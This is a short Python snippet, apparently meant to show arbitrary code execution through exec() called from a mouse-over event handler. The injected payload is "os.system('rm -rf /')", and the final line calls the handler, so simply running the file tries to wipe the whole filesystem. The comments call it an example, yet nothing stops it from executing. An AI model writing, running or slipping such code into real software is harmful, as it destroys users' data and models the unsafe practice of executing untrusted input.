def execute_arbitrary_script(script):
    # This function allows arbitrary execution of Python commands
    exec(script)

# Example of a potentially malicious script that could be executed
malicious_script = "import os; os.system('rm -rf /')"  # Dangerous command

# Simulating a script event handler that could trigger the execution
def on_mouse_over():
    execute_arbitrary_script(malicious_script)

# Trigger the event
on_mouse_over()